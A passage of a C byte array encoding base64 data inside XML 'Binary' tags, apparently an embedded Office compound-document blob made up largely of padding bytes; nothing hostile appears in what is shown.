	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x6F, 0x4B, 0x43, 0x67, 0x39, 0x57, 0x56, 0x6C, 0x61, 0x41,
	0x6C, 0x35, 0x65, 0x58, 0x32, 0x70, 0x47, 0x52, 0x6B, 0x64, 0x70, 0x4E, 0x54, 0x55, 0x32, 0x41,
	0x43, 0x41, 0x67, 0x49, 0x44, 0x77, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x42, 0x43, 0x54, 0x54, 0x34, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x50, 0x67, 0x41, 0x41, 0x41, 0x43, 0x67, 0x41,
	0x41, 0x41, 0x43, 0x41, 0x41, 0x41, 0x41, 0x41, 0x49, 0x41, 0x41, 0x41, 0x41, 0x41, 0x45, 0x41,
	0x41, 0x51, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x49, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x2F, 0x2F, 0x2F, 0x2F, 0x41, 0x41, 0x41, 0x41,
	0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x3D, 0x3D, 0x0D, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x2F, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x3C, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x3E, 0x0D, 0x0A, 0x41, 0x51, 0x41, 0x41, 0x41,
	0x42, 0x51, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x67, 0x41, 0x41, 0x41,
	0x41, 0x4D, 0x41, 0x41, 0x41, 0x41, 0x3D, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x42,
	0x69, 0x6E, 0x61, 0x72, 0x79, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x42, 0x69, 0x6E,
	0x61, 0x72, 0x79, 0x3E, 0x0D, 0x0A, 0x30, 0x4D, 0x38, 0x52, 0x34, 0x4B, 0x47, 0x78, 0x47, 0x75,
	0x45, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x50, 0x67, 0x41, 0x44, 0x41, 0x50, 0x37, 0x2F, 0x43, 0x51,
	0x41, 0x47, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x42, 0x41, 0x41, 0x41, 0x41, 0x41, 0x51, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x0D, 0x0A, 0x45, 0x41, 0x41, 0x41, 0x41, 0x67, 0x41, 0x41, 0x41, 0x41, 0x45, 0x41,
	0x41, 0x41, 0x44, 0x2B, 0x2F, 0x2F, 0x2F, 0x2F, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x44, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x0D, 0x0A, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x0D, 0x0A,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x0D, 0x0A, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x0D, 0x0A, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x0D, 0x0A, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x0D, 0x0A, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x0D, 0x0A, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x39, 0x0D, 0x0A, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x76, 0x2F, 0x2F, 0x2F, 0x2F, 0x37, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2B, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x0D, 0x0A, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x0D, 0x0A,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
